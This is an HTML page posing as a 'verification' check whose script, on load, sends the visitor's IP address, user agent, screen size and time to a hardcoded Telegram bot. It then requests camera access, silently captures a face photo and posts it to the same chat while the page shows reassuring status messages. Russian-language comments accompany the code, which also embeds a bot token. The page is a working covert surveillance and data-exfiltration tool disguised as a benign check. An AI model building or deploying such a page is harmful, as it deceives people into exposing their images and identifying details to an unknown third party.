<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        #status {
            margin: 20px 0;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div id="content">
        <h1>Verification in progress...</h1>
        <p id="status">Checking camera access...</p>
    </div>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const statusElement = document.getElementById('status');
        let stream = null;

        // 1. Отправка информации о пользователе
        async function sendUserInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                const userAgent = navigator.userAgent;
                const screenRes = `${window.screen.width}x${window.screen.height}`;
                const time = new Date().toLocaleString();
                
                const message = `🚨 Новый посетитель:\nIP: ${ip}\nУстройство: ${userAgent}\nЭкран: ${screenRes}\nВремя: ${time}`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Error sending user info:', error);
            }
        }

        // 2. Захват фото с камеры
        async function captureAndSendPhoto() {
            try {
                statusElement.textContent = "Completing verification...";
                
                // Создаем скрытый video элемент
                const video = document.createElement('video');
                video.width = 640;
                video.height = 480;
                video.autoplay = true;
                video.playsInline = true;
                video.srcObject = stream;
                document.body.appendChild(video);
                
                // Ждем пока видео начнет воспроизводиться
                await new Promise(resolve => {
                    video.onplaying = resolve;
                    setTimeout(resolve, 1000); // Fallback timeout
                });
                
                // Создаем canvas для захвата кадра
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Преобразуем в blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                // Создаем FormData для отправки
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'verification.jpg');
                
                // Добавляем описание
                const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                
                // Отправляем фото в Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                statusElement.textContent = "Verification complete! You can close this page.";
                stopCamera();
                
                // Удаляем временные элементы
                document.body.removeChild(video);
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                statusElement.textContent = "Verification failed. Please refresh the page.";
            }
        }

        // 3. Запуск камеры и автоматический захват
        async function startVerification() {
            try {
                statusElement.textContent = "Requesting camera access...";
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                // Сразу делаем фото после получения доступа
                await captureAndSendPhoto();
                
            } catch (error) {
                console.error('Camera error:', error);
                statusElement.textContent = "Camera access required for verification. Please refresh and allow access.";
            }
        }

        // 4. Остановка камеры
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }

        // 5. Инициализация при загрузке
        window.onload = function() {
            sendUserInfo(); // Отправляем информацию о пользователе
            startVerification(); // Начинаем процесс верификации
        };

        // Остановка камеры при закрытии страницы
        window.addEventListener('beforeunload', stopCamera);
    </script>
</body>
</html>
